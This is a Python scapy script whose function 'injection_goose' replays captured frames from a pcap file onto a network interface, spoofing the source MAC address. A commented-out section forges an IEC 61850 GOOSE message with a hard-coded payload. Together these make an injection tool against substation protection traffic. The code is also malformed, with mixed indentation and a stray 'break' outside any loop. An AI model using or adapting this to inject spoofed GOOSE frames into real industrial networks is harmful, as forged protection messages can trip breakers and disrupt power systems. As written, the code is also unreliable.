import time

from scapy.layers.l2 import Ether, Dot1Q
from scapy.packet import Raw
from scapy.sendrecv import sendp
from scapy.utils import rdpcap

def injection_goose(interface):
        pcap_name = input("\n[*] Enter the name of the PCAP file to be used (without extension): ")

        traffic = rdpcap(pcap_name + '.pcap')  # name of the.pcap
        for frame in traffic:  # frame = line
            if frame.haslayer(Ether) == 1 and frame.haslayer(Dot1Q) == 1 and frame.haslayer(Raw) == 1:
            	frame.src = "00:50:56:3C:BB:7C"
                print(frame)
                sendp(frame , iface=interface)
                time.sleep(0.1)

        '''
        header_content = Ether()
        header_content.dst = "00:50:56:3D:9E:FD"
        header_content.src = "00:50:56:3C:BB:7B"
        header_content.type = 0x8100
        # CONSTRUCTING VLAN HEADER  0x88b8
        header_VLAN = Dot1Q()
        header_VLAN.prio = 4
        header_VLAN.id = 0
        header_VLAN.vlan = 0
        header_VLAN.type = 0x88b8
        # CONSTRUCTING GOOSE MESSAGE
        goose_msg = Raw()
        goose_msg.load = "b'\x00\x01\x00P\x00\x00\x00\x00aF\x80\tLLN0$gcb1\x81\x02\x0f\xa0\x82\x08LLN0$DS4\x83\x02G1\x84\x08Y\xde8\xa2\xd6\x04\x13x\x85\x01\x07\x86\x01\x11\x87\x01\x01\x88\x01\x01\x89\x01\x00\x8a\x01\x03\xab\x0b\x83\x01\x01\x85\x01\n\x84\x03\x03@\x00'"
        # blablabla
        ls(header_VLAN)
        ls(goose_msg)
        ls(header_content)
        new_Goose_Frame = header_content / header_VLAN / goose_msg
        sendp(new_Goose_Frame , iface=interface)
    '''
        break